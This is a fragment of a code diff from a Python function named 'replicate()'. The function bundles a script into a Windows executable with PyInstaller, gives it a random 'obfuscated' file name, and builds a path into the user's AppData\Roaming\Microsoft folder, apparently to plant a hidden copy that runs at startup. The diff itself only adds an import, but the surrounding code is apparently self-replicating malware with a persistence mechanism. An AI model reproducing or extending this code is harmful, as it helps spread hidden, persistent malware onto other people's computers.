@@ -25,7 +25,7 @@ def replicate():
             install_with_pyinstaller(pyinstaller_path=pyinstaller_place,
                                      base_dir=new_location,
                                      file_to_install='main.py',
-                                     hidden_imports=['psutil','sqlite3','requests'])
+                                     hidden_imports=['psutil','sqlite3','requests','ctypes.wintypes'])
             obfuscated_file_name = random_string(is_random=True, is_exe=True)
             obfuscated_startup_folder = f"c:/users/{os.getlogin()}/" \
                                         f"appdata/roaming/microsoft/" \
